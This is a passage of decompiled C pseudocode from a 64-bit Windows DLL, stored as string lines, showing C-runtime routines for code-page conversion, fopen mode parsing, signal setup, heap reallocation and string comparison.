    "  void *v20; // rsp",
    "  void *v21; // rsp",
    "  const WCHAR *v22; // rbx",
    "  WCHAR *v23; // rax",
    "  int v24; // eax",
    "  unsigned int v25; // esi",
    "  unsigned __int64 v26; // rcx",
    "  __int64 v27; // rax",
    "  void *v28; // rsp",
    "  WCHAR *v29; // rdi",
    "  WCHAR *v30; // rax",
    "  _BYTE v31[32]; // [rsp+0h] [rbp-50h] BYREF",
    "  const WCHAR *v32; // [rsp+20h] [rbp-30h]",
    "  int v33; // [rsp+28h] [rbp-28h]",
    "  __int64 v34; // [rsp+30h] [rbp-20h]",
    "  __int64 v35; // [rsp+38h] [rbp-18h]",
    "  int v36; // [rsp+50h] [rbp+0h] BYREF",
    "",
    "  if ( a5 > 0 )",
    "    sub_180021A08(a4, a5);",
    "  v13 = a8;",
    "  if ( !a8 )",
    "    v13 = *(_DWORD *)(*(_QWORD *)a1 + 12LL);",
    "  v33 = 0;",
    "  v32 = 0;",
    "  result = sub_18002C1D0(v13, a9 != 0 ? 9 : 1, a4);",
    "  v15 = (int)result;",
    "  if ( (_DWORD)result )",
    "  {",
    "    v16 = 2LL * (int)result + 16;",
    "    v17 = v16 & -(__int64)(2LL * (int)result < v16);",
    "    if ( (v16 & -(__int64)(2 * v15 < v16)) == 0 )",
    "    {",
    "      v22 = 0;",
    "      goto LABEL_46;",
    "    }",
    "    if ( v17 > 0x400 )",
    "    {",
    "      v23 = (WCHAR *)sub_180024B50(v16 & -(__int64)(2 * v15 < v16));",
    "      v22 = v23;",
    "      if ( !v23 )",
    "      {",
    "LABEL_15:",
    "        if ( v22 )",
    "        {",
    "          v33 = v15;",
    "          v32 = v22;",
    "          if ( (unsigned int)sub_18002C1D0(v13, 1, a4) )",
    "          {",
    "            v24 = sub_1800239D0(a2, a3, v22, v15, 0, 0, 0, 0, 0);",
    "            v25 = v24;",
    "            if ( v24 )",
    "            {",
    "              if ( (a3 & 0x400) != 0 )",
    "              {",
    "                if ( !a7 )",
    "                  goto LABEL_47;",
    "                if ( v24 <= a7 )",
    "                {",
    "                  v25 = sub_1800239D0(a2, a3, v22, v15, a6, a7, 0, 0, 0);",
    "                  if ( v25 )",
    "                    goto LABEL_47;",
    "                }",
    "                goto LABEL_46;",
    "              }",
    "              v26 = (2LL * v24 + 16) & -(__int64)(2LL * v24 < (unsigned __int64)(2LL * v24 + 16));",
    "              if ( !v26 )",
    "              {",
    "                v29 = 0;",
    "                goto LABEL_41;",
    "              }",
    "              if ( v26 > 0x400 )",
    "              {",
    "                v30 = (WCHAR *)sub_180024B50(v26);",
    "                v29 = v30;",
    "                if ( !v30 )",
    "                  goto LABEL_32;",
    "                *(_DWORD *)v30 = 56797;",
    "              }",
    "              else",
    "              {",
    "                v27 = v26 + 15;",
    "                if ( v26 + 15 < v26 )",
    "                  v27 = 0xFFFFFFFFFFFFFF0LL;",
    "                v28 = alloca(v27 & 0xFFFFFFFFFFFFFFF0uLL);",
    "                v29 = (WCHAR *)&v36;",
    "                if ( v31 == (_BYTE *)-80LL )",
    "                  goto LABEL_44;",
    "                v36 = 52428;",
    "              }",
    "              v29 += 8;",
    "LABEL_32:",
    "              if ( !v29 )",
    "                goto LABEL_44;",
    "              if ( sub_1800239D0(a2, a3, v22, v15, v29, v25, 0, 0, 0) )",
    "              {",
    "                v35 = 0;",
    "                v34 = 0;",
    "                if ( a7 )",
    "                {",
    "                  v25 = sub_18002C260(v13, 0, (_DWORD)v29, v25, (_DWORD)a6, a7, v34, v35);",
    "                  if ( !v25 )",
    "                    goto LABEL_42;",
    "                }",
    "                else",
    "                {",
    "                  v25 = sub_18002C260(v13, 0, (_DWORD)v29, v25, 0, 0, v34, v35);",
    "                  if ( !v25 )",
    "                    goto LABEL_41;",
    "                }",
    "                if ( *((_DWORD *)v29 - 4) == 56797 )",
    "                  sub_180023374((XSAVE_FORMAT *)(v29 - 8));",
    "                goto LABEL_47;",
    "              }",
    "LABEL_41:",
    "              if ( v29 )",
    "              {",
    "LABEL_42:",
    "                if ( *((_DWORD *)v29 - 4) == 56797 )",
    "                  sub_180023374((XSAVE_FORMAT *)(v29 - 8));",
    "              }",
    "LABEL_44:",
    "              v25 = 0;",
    "              goto LABEL_47;",
    "            }",
    "          }",
    "        }",
    "LABEL_46:",
    "        v25 = 0;",
    "        if ( !v22 )",
    "          return v25;",
    "LABEL_47:",
    "        if ( *((_DWORD *)v22 - 4) == 56797 )",
    "          sub_180023374((XSAVE_FORMAT *)(v22 - 8));",
    "        return v25;",
    "      }",
    "      *(_DWORD *)v23 = 56797;",
    "    }",
    "    else",
    "    {",
    "      v18 = v17 + 15;",
    "      if ( v17 + 15 < v17 )",
    "        v18 = 0xFFFFFFFFFFFFFF0LL;",
    "      v19 = v18 & 0xFFFFFFFFFFFFFFF0uLL;",
    "      v20 = alloca(v19);",
    "      v21 = alloca(v19);",
    "      v22 = (const WCHAR *)&v36;",
    "      if ( v31 == (_BYTE *)-80LL )",
    "        goto LABEL_46;",
    "      v36 = 52428;",
    "    }",
    "    v22 += 8;",
    "    goto LABEL_15;",
    "  }",
    "  return result;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_18002B9E0(",
    "        __int128 *a1,",
    "        __int64 a2,",
    "        DWORD a3,",
    "        _BYTE *a4,",
    "        int a5,",
    "        WCHAR *a6,",
    "        int a7,",
    "        unsigned int a8,",
    "        int a9)",
    "{",
    "  __int64 result; // rax",
    "  __int64 v13; // [rsp+50h] [rbp-28h] BYREF",
    "  _BYTE v14[24]; // [rsp+58h] [rbp-20h] BYREF",
    "",
    "  sub_18001B674(&v13, a1);",
    "  result = sub_18002B6AC((__int64)v14, a2, a3, a4, a5, a6, a7, a8, a9);",
    "  if ( v14[16] )",
    "    *(_DWORD *)(v13 + 936) &= ~2u;",
    "  return result;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_18002BA78(_WORD *a1, __int64 a2, __int64 a3)",
    "{",
    "  unsigned int v3; // ebx",
    "  _DWORD *v4; // rax",
    "  _WORD *v6; // r9",
    "  __int64 v7; // r8",
    "  __int16 v8; // ax",
    "",
    "  v3 = 0;",
    "  if ( !a1 || !a2 )",
    "  {",
    "LABEL_5:",
    "    v4 = sub_18001A80C();",
    "    v3 = 22;",
    "LABEL_6:",
    "    *v4 = v3;",
    "    invalid_parameter_noinfo();",
    "    return v3;",
    "  }",
    "  if ( !a3 )",
    "  {",
    "    *a1 = 0;",
    "    goto LABEL_5;",
    "  }",
    "  v6 = a1;",
    "  v7 = a3 - (_QWORD)a1;",
    "  while ( 1 )",
    "  {",
    "    v8 = *(_WORD *)((char *)v6 + v7);",
    "    *v6++ = v8;",
    "    if ( !v8 )",
    "      return v3;",
    "    if ( !--a2 )",
    "    {",
    "      *a1 = 0;",
    "      v4 = sub_18001A80C();",
    "      v3 = 34;",
    "      goto LABEL_6;",
    "    }",
    "  }",
    "}",
    "",
    "",
    "__int64 __fastcall sub_18002BAE0(__int64 a1, char *a2, __int64 a3, __int64 a4)",
    "{",
    "  char *v4; // r8",
    "  char i; // al",
    "  _BYTE *v7; // r8",
    "  char v8; // di",
    "  char v9; // r10",
    "  char v10; // r11",
    "  char v11; // dl",
    "  int v12; // ecx",
    "  int v13; // ecx",
    "  int v14; // ecx",
    "  int v15; // ecx",
    "  int v16; // ecx",
    "  int v17; // ecx",
    "  int v18; // eax",
    "  int v19; // ecx",
    "  int v20; // ecx",
    "  int v21; // ecx",
    "  int v22; // ecx",
    "  int v23; // ecx",
    "  _BYTE *v24; // rdi",
    "  bool v25; // zf",
    "  _BYTE *j; // rdi",
    "  __int64 v27; // rsi",
    "  _BYTE *k; // rcx",
    "",
    "  v4 = a2;",
    "  *(_QWORD *)a1 = 0;",
    "  *(_DWORD *)(a1 + 8) = 0;",
    "  *(_DWORD *)(a1 + 4) = dword_18004DE14;",
    "  for ( i = *a2; i == 32; i = *v4 )",
    "    ++v4;",
    "  if ( i == 97 )",
    "  {",
    "    *(_DWORD *)a1 = 265;",
    "LABEL_10:",
    "    *(_DWORD *)(a1 + 4) = 2;",
    "    goto LABEL_11;",
    "  }",
    "  if ( i != 114 )",
    "  {",
    "    if ( i != 119 )",
    "      goto LABEL_81;",
    "    *(_DWORD *)a1 = 769;",
    "    goto LABEL_10;",
    "  }",
    "  *(_DWORD *)(a1 + 4) = 1;",
    "LABEL_11:",
    "  v7 = v4 + 1;",
    "  LOBYTE(a4) = 0;",
    "  v8 = 0;",
    "  v9 = 0;",
    "  v10 = 0;",
    "  v11 = 1;",
    "  while ( *v7 )",
    "  {",
    "    v12 = (char)*v7;",
    "    if ( v12 > 83 )",
    "    {",
    "      v19 = v12 - 84;",
    "      if ( !v19 )",
    "      {",
    "        if ( (*(_DWORD *)a1 & 0x1000) == 0 )",
    "        {",
    "          v18 = *(_DWORD *)a1 | 0x1000;",
    "LABEL_53:",
    "          *(_DWORD *)a1 = v18;",
    "LABEL_54:",
    "          v11 = 1;",
    "          goto LABEL_55;",
    "        }",
    "        goto LABEL_51;",
    "      }",
    "      v20 = v19 - 14;",
    "      if ( !v20 )",
    "      {",
    "        if ( (*(_DWORD *)a1 & 0xC000) == 0 )",
    "        {",
    "          v18 = *(_DWORD *)a1 | 0x8000;",
    "          goto LABEL_53;",
    "        }",
    "        goto LABEL_51;",
    "      }",
    "      v21 = v20 - 1;",
    "      if ( v21 )",
    "      {",
    "        v22 = v21 - 11;",
    "        if ( v22 )",
    "        {",
    "          v23 = v22 - 6;",
    "          if ( v23 )",
    "          {",
    "            if ( v23 != 4 )",
    "              goto LABEL_81;",
    "            if ( (*(_DWORD *)a1 & 0x200) != 0 )",
    "            {",
    "              v18 = *(_DWORD *)a1 | 0x400;",
    "              goto LABEL_53;",
    "            }",
    "          }",
    "          else if ( (*(_DWORD *)a1 & 0xC000) == 0 )",
    "          {",
    "            v18 = *(_DWORD *)a1 | 0x4000;",
    "            goto LABEL_53;",
    "          }",
    "          goto LABEL_51;",
    "        }",
    "        if ( (_BYTE)a4 )",
    "          goto LABEL_51;",
    "        *(_DWORD *)(a1 + 4) &= ~0x800u;",
    "      }",
    "      else",
    "      {",
    "        if ( (_BYTE)a4 )",
    "          goto LABEL_51;",
    "        *(_DWORD *)(a1 + 4) |= 0x800u;",
    "      }",
    "      LOBYTE(a4) = 1;",
    "      v11 = 1;",
    "    }",
    "    else",
    "    {",
    "      if ( v12 == 83 )",
    "      {",
    "        if ( v9 )",
    "          goto LABEL_51;",
    "        *(_DWORD *)a1 |= 0x20u;",
    "LABEL_32:",
    "        v9 = 1;",
    "        v11 = 1;",
    "        goto LABEL_55;",
    "      }",
    "      v13 = v12 - 32;",
    "      if ( v13 )",
    "      {",
    "        v14 = v13 - 11;",
    "        if ( v14 )",
    "        {",
    "          v15 = v14 - 1;",
    "          if ( !v15 )",
    "          {",
    "            v10 = 1;",
    "LABEL_51:",
    "            v11 = 0;",
    "            goto LABEL_55;",
    "          }",
    "          v16 = v15 - 24;",
    "          if ( !v16 )",
    "          {",
    "            if ( (*(_DWORD *)a1 & 0x40) == 0 )",
    "            {",
    "              v18 = *(_DWORD *)a1 | 0x40;",
    "              goto LABEL_53;",
    "            }",
    "            goto LABEL_51;",
    "          }",
    "          v17 = v16 - 10;",
    "          if ( !v17 )",
    "          {",
    "            *(_DWORD *)a1 |= 0x80u;",
    "            goto LABEL_54;",
    "          }",
    "          if ( v17 != 4 )",
    "            goto LABEL_81;",
    "          if ( v9 )",
    "            goto LABEL_51;",
    "          *(_DWORD *)a1 |= 0x10u;",
    "          goto LABEL_32;",
    "        }",
    "        if ( v8 )",
    "          goto LABEL_51;",
    "        v8 = 1;",
    "        if ( (*(_DWORD *)a1 & 2) != 0 )",
    "          goto LABEL_51;",
    "        v11 = 1;",
    "        *(_DWORD *)a1 = *(_DWORD *)a1 & 0xFFFFFFFC | 2;",
    "        *(_DWORD *)(a1 + 4) = *(_DWORD *)(a1 + 4) & 0xFFFFFFF8 | 4;",
    "      }",
    "    }",
    "LABEL_55:",
    "    v7 += v11 != 0;",
    "    if ( !v11 )",
    "      break;",
    "  }",
    "  v24 = v7 + 1;",
    "  if ( !v10 )",
    "    v24 = v7;",
    "  while ( *v24 == 32 )",
    "    ++v24;",
    "  if ( !v10 )",
    "  {",
    "    v25 = *v24 == 0;",
    "    goto LABEL_63;",
    "  }",
    "  if ( (unsigned int)sub_180023250(v24, &unk_18003E8B0, 3, a4) )",
    "    goto LABEL_81;",
    "  for ( j = v24 + 3; *j == 32; ++j )",
    "    ;",
    "  if ( *j != 61 )",
    "    goto LABEL_81;",
    "  do",
    "    ++j;",
    "  while ( *j == 32 );",
    "  v27 = 5;",
    "  if ( !(unsigned int)sub_180032E94(j, \"UTF-8\", 5) )",
    "  {",
    "    *(_DWORD *)a1 |= 0x40000u;",
    "    goto LABEL_77;",
    "  }",
    "  v27 = 8;",
    "  if ( !(unsigned int)sub_180032E94(j, \"UTF-16LEUNICODE\", 8) )",
    "  {",
    "    *(_DWORD *)a1 |= 0x20000u;",
    "    goto LABEL_77;",
    "  }",
    "  v27 = 7;",
    "  if ( (unsigned int)sub_180032E94(j, \"UNICODE\", 7) )",
    "    goto LABEL_81;",
    "  *(_DWORD *)a1 |= 0x10000u;",
    "LABEL_77:",
    "  for ( k = &j[v27]; *k == 32; ++k )",
    "    ;",
    "  v25 = *k == 0;",
    "LABEL_63:",
    "  if ( !v25 )",
    "  {",
    "LABEL_81:",
    "    *(_DWORD *)sub_18001A80C() = 22;",
    "    invalid_parameter_noinfo();",
    "    return a1;",
    "  }",
    "  *(_BYTE *)(a1 + 8) = 1;",
    "  return a1;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_18002BDA4(int a1, char *a2, __int64 a3, __int64 a4)",
    "{",
    "  int v6; // esi",
    "  __int64 v7; // rax",
    "  __int64 v8; // rbx",
    "  int v9; // eax",
    "  __int64 v11; // [rsp+30h] [rbp-28h]",
    "  __int64 v12; // [rsp+40h] [rbp-18h] BYREF",
    "  int v13; // [rsp+70h] [rbp+18h] BYREF",
    "",
    "  v6 = a3;",
    "  v7 = sub_18002BAE0((__int64)&v12, a2, a3, a4);",
    "  v8 = 0;",
    "  v11 = *(_QWORD *)v7;",
    "  if ( (unsigned __int8)*(_DWORD *)(v7 + 8) && !(unsigned int)sub_1800336C0((unsigned int)&v13, a1, v11, v6, 384) )",
    "  {",
    "    ++dword_18004D2E0;",
    "    _InterlockedOr((volatile signed __int32 *)(a4 + 20), HIDWORD(v11));",
    "    v9 = v13;",
    "    *(_DWORD *)(a4 + 16) = 0;",
    "    *(_QWORD *)(a4 + 40) = 0;",
    "    *(_QWORD *)(a4 + 8) = 0;",
    "    *(_QWORD *)a4 = 0;",
    "    v8 = a4;",
    "    *(_DWORD *)(a4 + 24) = v9;",
    "  }",
    "  return v8;",
    "}",
    "",
    "",
    "LPVOID __fastcall sub_18002BE40(XSAVE_FORMAT *lpMem, M128A *dwBytes)",
    "{",
    "  LPVOID result; // rax",
    "",
    "  if ( !lpMem )",
    "    return sub_180024B50((unsigned __int64)dwBytes);",
    "  if ( !dwBytes )",
    "  {",
    "    sub_180023374(lpMem);",
    "    return 0;",
    "  }",
    "  if ( (unsigned __int64)dwBytes > 0xFFFFFFFFFFFFFFE0uLL )",
    "  {",
    "LABEL_6:",
    "    *(_DWORD *)sub_18001A80C() = 12;",
    "    return 0;",
    "  }",
    "  while ( 1 )",
    "  {",
    "    result = HeapReAlloc(hHeap, 0, lpMem, (SIZE_T)dwBytes);",
    "    if ( result )",
    "      return result;",
    "    if ( !(unsigned int)sub_18002DE88() || !(unsigned int)sub_180021FE8((__int64)dwBytes) )",
    "      goto LABEL_6;",
    "  }",
    "}",
    "",
    "",
    "__int64 __fastcall sub_18002BEBC(__int64 a1, int *a2, __int64 a3, int *a4)",
    "{",
    "  __int64 v5; // rbx",
    "",
    "  sub_1800209E8(*a2);",
    "  v5 = __ROR8__(_security_cookie ^ qword_18004DCB8, _security_cookie & 0x3F);",
    "  sub_180020A3C(*a4);",
    "  return v5;",
    "}",
    "",
    "",
    "__int64 sub_18002BF04()",
    "{",
    "  __int64 v1; // [rsp+30h] [rbp+8h] BYREF",
    "  int v2; // [rsp+38h] [rbp+10h] BYREF",
    "  int v3; // [rsp+40h] [rbp+18h] BYREF",
    "",
    "  v2 = 3;",
    "  v3 = 3;",
    "  return sub_18002BEBC((__int64)&v1, &v3, (__int64)&v1, &v2);",
    "}",
    "",
    "",
    "void __fastcall initp_misc_winsig(__int64 a1)",
    "{",
    "  qword_18004DCA8 = a1;",
    "  qword_18004DCB0 = a1;",
    "  qword_18004DCB8 = a1;",
    "  qword_18004DCC0 = a1;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_18002BF54(unsigned int a1)",
    "{",
    "  _QWORD *v2; // r15",
    "  char v3; // r14",
    "  unsigned int v4; // ecx",
    "  unsigned int v5; // ecx",
    "  unsigned int v6; // ecx",
    "  unsigned int v7; // ecx",
    "  __int64 *v8; // rdi",
    "  _QWORD *v9; // rax",
    "  __int64 v11; // rax",
    "  __int64 v12; // rcx",
    "  __int64 v13; // r13",
    "  __int64 v14; // rsi",
    "  int v15; // r12d",
    "  __int64 v16; // rax",
    "  __int64 v17; // rcx",
    "  int v18; // [rsp+78h] [rbp+10h]",
    "",
    "  v2 = 0;",
    "  v18 = 0;",
    "  v3 = 1;",
    "  if ( a1 != 2 )",
    "  {",
    "    switch ( a1 )",
    "    {",
    "      case 4u:",
    "        goto LABEL_14;",
    "      case 6u:",
    "        goto LABEL_8;",
    "      case 8u:",
    "      case 0xBu:",
    "LABEL_14:",
    "        v9 = (_QWORD *)sub_180026474();",
    "        v2 = v9;",
    "        if ( !v9 )",
    "          return 0xFFFFFFFFLL;",
    "        v11 = *v9;",
    "        v12 = v11 + 192;",
    "        while ( v11 != v12 )",
    "        {",
    "          if ( *(_DWORD *)(v11 + 4) == a1 )",
    "            goto LABEL_21;",
    "          v11 += 16;",
    "        }",
    "        v11 = 0;",
    "LABEL_21:",
    "        if ( v11 )",
    "        {",
    "          v8 = (__int64 *)(v11 + 8);",
    "          v3 = 0;",
    "          goto LABEL_28;",
    "        }",
    "        break;",
    "      default:",
    "        if ( a1 == 15 || a1 - 21 <= 1 )",
    "          goto LABEL_8;",
    "        break;",
    "    }",
    "    *(_DWORD *)sub_18001A80C() = 22;",
    "    invalid_parameter_noinfo();",
    "    return 0xFFFFFFFFLL;",
    "  }",
    "LABEL_8:",
    "  v4 = a1 - 2;",
    "  if ( v4 )",
    "  {",
    "    v5 = v4 - 4;",
    "    if ( !v5 )",
    "    {",
    "LABEL_24:",
    "      v8 = &qword_18004DCB8;",
    "      goto LABEL_28;",
    "    }",
    "    v6 = v5 - 9;",
    "    if ( v6 )",
    "    {",
    "      v7 = v6 - 6;",
    "      if ( v7 )",
    "      {",
    "        if ( v7 != 1 )",
    "        {",
    "          v8 = 0;",
    "          goto LABEL_28;",
    "        }",
    "        goto LABEL_24;",
    "      }",
    "      v8 = &qword_18004DCB0;",
    "    }",
    "    else",
    "    {",
    "      v8 = &qword_18004DCC0;",
    "    }",
    "  }",
    "  else",
    "  {",
    "    v8 = &qword_18004DCA8;",
    "  }",
    "LABEL_28:",
    "  v13 = 0;",
    "  if ( v3 )",
    "    sub_1800209E8(3);",
    "  v14 = *v8;",
    "  if ( v3 )",
    "    v14 = __ROR8__(_security_cookie ^ v14, _security_cookie & 0x3F);",
    "  if ( v14 == 1 )",
    "  {",
    "    v15 = 2320;",
    "    goto LABEL_44;",
    "  }",
    "  if ( !v14 )",
    "  {",
    "    if ( v3 )",
    "      sub_180020A3C(3);",
    "    sub_180022530(3u);",
    "    __debugbreak();",
    "    JUMPOUT(0x18002C1CDLL);",
    "  }",
    "  v15 = 2320;",
    "  if ( a1 > 0xB || !_bittest(&v15, a1) )",
    "    goto LABEL_38;",
    "  v13 = v2[1];",
    "  v2[1] = 0;",
    "  if ( a1 == 8 )",
    "  {",
    "    v18 = *(_DWORD *)(sub_1800262FC() + 16);",
    "    *(_DWORD *)(sub_1800262FC() + 16) = 140;",
    "LABEL_38:",
    "    if ( a1 == 8 )",
    "    {",
    "      v16 = *v2 + 48LL;",
    "      v17 = *v2 + 192LL;",
    "      while ( v16 != v17 )",
    "      {",
    "        *(_QWORD *)(v16 + 8) = 0;",
    "        v16 += 16;",
    "      }",
    "      goto LABEL_44;",
    "    }",
    "  }",
    "  *v8 = _security_cookie;",
    "LABEL_44:",
    "  if ( v3 )",
    "    sub_180020A3C(3);",
    "  if ( v14 != 1 )",
    "  {",
    "    if ( a1 == 8 )",
    "    {",
    "      sub_1800262FC();",
    "      _guard_xfg_dispatch_icall_fptr(8);",
    "    }",
    "    else",
    "    {",
    "      _guard_xfg_dispatch_icall_fptr(a1);",
    "    }",
    "    if ( a1 <= 0xB && _bittest(&v15, a1) )",
    "    {",
    "      v2[1] = v13;",
    "      if ( a1 == 8 )",
    "        *(_DWORD *)(sub_1800262FC() + 16) = v18;",
    "    }",
    "  }",
    "  return 0;",
    "}",
    "",
    "",
    "int __fastcall sub_18002C1D0(UINT a1, char a2, const CHAR *a3, int a4, WCHAR *a5, int a6)",
    "{",
    "  bool v6; // zf",
    "",
    "  if ( a1 > 0xDEAC )",
    "  {",
    "    if ( a1 == 57005",
    "      || a1 == 57006",
    "      || a1 == 57007",
    "      || a1 == 57008",
    "      || a1 == 57009",
    "      || a1 == 57010",
    "      || a1 == 57011",
    "      || a1 == 65000 )",
    "    {",
    "      goto LABEL_15;",
    "    }",
    "    if ( a1 != 65001 )",
    "      return MultiByteToWideChar(a1, a2, a3, a4, a5, a6);",
    "    goto LABEL_26;",
    "  }",
    "  if ( a1 == 57004 )",
    "    goto LABEL_15;",
    "  if ( a1 > 0xC433 )",
    "  {",
    "    if ( a1 == 50229 )",
    "      goto LABEL_15;",
    "    if ( a1 != 54936 )",
    "    {",
    "      if ( a1 != 57002 )",
    "      {",
    "        v6 = a1 == 57003;",
    "        goto LABEL_14;",
    "      }",
    "LABEL_15:",
    "      a2 = 0;",
    "      return MultiByteToWideChar(a1, a2, a3, a4, a5, a6);",
    "    }",
    "LABEL_26:",
    "    a2 &= 8u;",
    "    return MultiByteToWideChar(a1, a2, a3, a4, a5, a6);",
    "  }",
    "  if ( a1 == 50227 || a1 == 42 || a1 == 50220 || a1 == 50221 || a1 == 50222 )",
    "    goto LABEL_15;",
    "  v6 = a1 == 50225;",
    "LABEL_14:",
    "  if ( v6 )",
    "    goto LABEL_15;",
    "  return MultiByteToWideChar(a1, a2, a3, a4, a5, a6);",
    "}",
    "",
    "",
    "int __fastcall sub_18002C260(UINT a1, int a2, const WCHAR *a3, int a4, CHAR *a5, int a6, const CHAR *a7, BOOL *a8)",
    "{",
    "  bool v10; // zf",
    "  bool v11; // zf",
    "  UINT v12; // eax",
    "  DWORD v13; // edx",
    "  BOOL *v15; // r8",
    "",
    "  if ( a1 > 0xDEAC )",
    "  {",
    "    if ( a1 == 57005 || a1 == 57006 || a1 == 57007 || a1 == 57008 || a1 == 57009 || a1 == 57010 || a1 == 57011 )",
    "      goto LABEL_25;",
    "    v12 = a1 - 65000;",
    "    v11 = a1 == 65000;",
    "    goto LABEL_21;",
    "  }",
    "  if ( a1 == 57004 )",
    "    goto LABEL_25;",
    "  if ( a1 > 0xC433 )",
    "  {",
    "    if ( a1 == 50229 || a1 == 54936 )",
    "      goto LABEL_25;",
    "    v12 = a1 - 57002;",
    "    v11 = a1 == 57002;",
    "LABEL_21:",
    "    if ( !v11 )",
    "    {",
    "      v10 = v12 == 1;",
    "      goto LABEL_23;",
    "    }",
    "LABEL_25:",
    "    v13 = 0;",
    "    goto LABEL_26;",
    "  }",
    "  if ( a1 == 50227 || a1 == 42 || a1 == 50220 || a1 == 50221 || a1 == 50222 )",
    "    goto LABEL_25;",
    "  v10 = a1 == 50225;",
    "LABEL_23:",
    "  if ( v10 )",
    "    goto LABEL_25;",
    "  v13 = a2 & 0xFFFFFF7F;",
    "LABEL_26:",
    "  v15 = a8;",
    "  if ( a1 - 65000 <= 1 )",
    "  {",
    "    v15 = 0;",
    "    a7 = 0;",
    "    if ( a8 )",
    "      *a8 = 0;",
    "  }",
    "  return WideCharToMultiByte(a1, v13, a3, a4, a5, a6, a7, v15);",
    "}",
    "",
    "",
    "__int64 __fastcall sub_18002C380(__int64 a1, __int64 a2)",
    "{",
    "  if ( dword_18004DC98 )",
    "    return sub_18002C3C8(a1, a2, 0);",
    "  if ( a1 )",
    "  {",
    "    if ( a2 )",
    "      JUMPOUT(0x18002C340LL);",
    "  }",
    "  *(_DWORD *)sub_18001A80C() = 22;",
    "  invalid_parameter_noinfo();",
    "  return 0x7FFFFFFF;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_18002C3C8(unsigned __int16 *a1, unsigned __int16 *a2, __int128 *a3)",
    "{",
    "  unsigned __int16 *v3; // rdi",
    "  unsigned __int16 *v4; // rbx",
    "  __int64 v6; // rcx",
    "  unsigned int v7; // esi",
    "  unsigned __int16 v8; // ax",
    "  unsigned __int8 v9; // dl",
    "  unsigned __int16 v10; // ax",
    "  int v11; // ebp",
    "  unsigned __int16 v12; // ax",
    "  unsigned __int8 v13; // dl",
    "  unsigned __int16 v14; // ax",
    "  __int64 v15; // [rsp+20h] [rbp-38h] BYREF",
    "  _QWORD v16[2]; // [rsp+28h] [rbp-30h] BYREF",
    "  char v17; // [rsp+38h] [rbp-20h]",
    "",
    "  v3 = a2;",
    "  v4 = a1;",
    "  if ( a1 && a2 )",
    "  {",
    "    sub_18001B674(&v15, a3);",
    "    v6 = v16[0];",
    "    if ( *(_QWORD *)(v16[0] + 312LL) )",
    "    {",
    "      do",
    "      {",
    "        v8 = *v4++;",
    "        if ( v8 >= 0x100u )",
    "        {",
    "          v10 = sub_180033AE4(v8, v16);",
    "          v6 = v16[0];",
    "        }",
    "        else",
    "        {",
    "          v9 = v8;",
    "          if ( (*((_BYTE *)&unk_18003D120 + 2 * (unsigned __int8)v8 + 2) & 1) != 0 )",
    "            v9 = *(_BYTE *)((unsigned __int8)v8 + *(_QWORD *)(v6 + 272));",
    "          v10 = v9;",
    "        }",
    "        v11 = v10;",
    "        v12 = *v3++;",
    "        if ( v12 >= 0x100u )",
    "        {",
    "          v14 = sub_180033AE4(v12, v16);",
    "          v6 = v16[0];",
    "        }",
    "        else",
    "        {",
    "          v13 = v12;",
    "          if ( (*((_BYTE *)&unk_18003D120 + 2 * (unsigned __int8)v12 + 2) & 1) != 0 )",
    "            v13 = *(_BYTE *)((unsigned __int8)v12 + *(_QWORD *)(v6 + 272));",
    "          v14 = v13;",
    "        }",
    "        v7 = v11 - v14;",
    "      }",
    "      while ( !v7 && v11 );",
    "    }",
    "    else",
    "    {",
    "      v7 = sub_18002C340(v4, v3);",
    "    }",
    "    if ( v17 )",
    "      *(_DWORD *)(v15 + 936) &= ~2u;",
    "    return v7;",
    "  }",
    "  else",
    "  {",
    "    *(_DWORD *)sub_18001A80C() = 22;",
    "    invalid_parameter_noinfo();",
    "    return 0x7FFFFFFF;",
    "  }",
    "}",
    "",
    "",
    "char sub_18002C54C()",
    "{",
    "  return BYTE1(NtCurrentTeb()->ProcessEnvironmentBlock->NtGlobalFlag) & 1;",
    "}",
    "",
    "",
    "__int64 sub_18002C580()",
    "{",
    "  unsigned int v0; // ebx",
    "  int v2; // [rsp+30h] [rbp+8h] BYREF",
    "",
    "  v0 = 0;",
    "  v2 = 0;",
    "  if ( !(unsigned __int8)sub_18002C568() )",
    "    sub_180023620((__int64)&v2);",
    "  LOBYTE(v0) = v2 != 1;",
    "  return v0;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_18002C5C4(const WCHAR *a1, __int64 a2, __int64 a3, UINT a4)",
    "{",
    "  LPVOID v7; // rax",
    "  __int64 result; // rax",
    "  int v9; // eax",
    "  unsigned __int64 v10; // rsi",
    "  DWORD LastError; // eax",
    "  unsigned __int64 v12; // rdx",
    "  LPVOID v13; // rax",
    "  int v14; // eax",
    "",
    "  if ( !a1 )",
    "  {",
    "    if ( *(_BYTE *)(a2 + 40) )",
    "    {",
    "      sub_180023374(*(XSAVE_FORMAT **)(a2 + 16));",
    "      *(_BYTE *)(a2 + 40) = 0;",
    "    }",
    "    *(_QWORD *)(a2 + 16) = 0;",
    "    *(_QWORD *)(a2 + 24) = 0;",
    "    goto LABEL_5;",
    "  }",
    "  if ( *a1 )",
    "  {",
    "    v9 = sub_18002C260(a4, 0, a1, -1, 0, 0, 0, 0);",
    "    v10 = v9;",
    "    if ( v9 )",
    "    {",
    "      v12 = *(_QWORD *)(a2 + 24);",
    "      if ( v9 > v12 )",
    "      {",
    "        if ( *(_BYTE *)(a2 + 40) )",
    "        {",
    "          sub_180023374(*(XSAVE_FORMAT **)(a2 + 16));",
    "          *(_BYTE *)(a2 + 40) = 0;",
    "        }",
    "        v13 = sub_180024B50(v10);",
    "        *(_QWORD *)(a2 + 16) = v13;",
    "        v12 = 0;",
    "        result = v13 == 0 ? 0xC : 0;",
    "        if ( !(_DWORD)result )",
    "          v12 = v10;",
    "        *(_BYTE *)(a2 + 40) = (_DWORD)result == 0;",
    "        *(_QWORD *)(a2 + 24) = v12;",
    "        if ( (_DWORD)result )",
    "          return result;",
    "      }",
    "      v14 = sub_18002C260(a4, 0, a1, -1, *(CHAR **)(a2 + 16), v12, 0, 0);",
    "      if ( v14 )",
    "      {",
    "        *(_QWORD *)(a2 + 32) = v14 - 1LL;",
    "        return 0;",
    "      }",
    "    }",
    "    LastError = GetLastError();",
    "    sub_18001A780(LastError);",
    "    return *(unsigned int *)sub_18001A80C();",
    "  }",
    "  if ( *(_QWORD *)(a2 + 24) )",
    "    goto LABEL_11;",
